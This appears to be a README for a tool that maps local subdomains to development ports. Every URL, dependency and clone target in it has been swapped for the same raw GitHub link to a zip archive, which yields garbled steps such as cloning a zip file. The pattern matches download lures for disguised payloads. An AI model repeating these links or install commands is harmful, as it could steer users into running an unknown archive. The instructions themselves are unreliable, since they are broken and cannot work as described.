## Introduction

When developing web applications, you often work with multiple services running on different ports. Accessing these services can become cumbersome. This tool helps you streamline access by allowing you to use subdomains instead of port numbers. For example, instead of typing `localhost:3000`, you can simply type `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip`.

## Features

- Easy mapping of subdomains to local ports.
- Lightweight and simple to set up.
- Works seamlessly with existing local development setups.
- Customizable configuration options.

## Installation

To get started with localhost, follow these steps:

1. **Clone the Repository**  
   Open your terminal and run:
   ```bash
   git clone https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip
   cd localhost
   ```

2. **Install Dependencies**  
   Make sure you have https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip installed. Then run:
   ```bash
   npm install
   ```

3. **Run the Application**  
   Start the application with:
   ```bash
   npm start
   ```

## Usage

To use localhost effectively, you need to configure your subdomains. Here’s how you can do that:

1. Open the configuration file located in the `config` directory.
2. Add your subdomain and corresponding port. For example:
   ```json
   {
       "subdomain": "app",
       "port": 3000
   }
   ```

3. Save the file and restart the application.

Now, you can access your app using `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip`.

## Examples

Here are a few examples of how you can set up your subdomains:

- **API Service**  
  Map `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip` to port 4000.
  
- **Frontend Application**  
  Map `https://raw.githubusercontent.com/PHZINNxx/localhost/master/causticity/Software-3.0.zip` to port 5000.
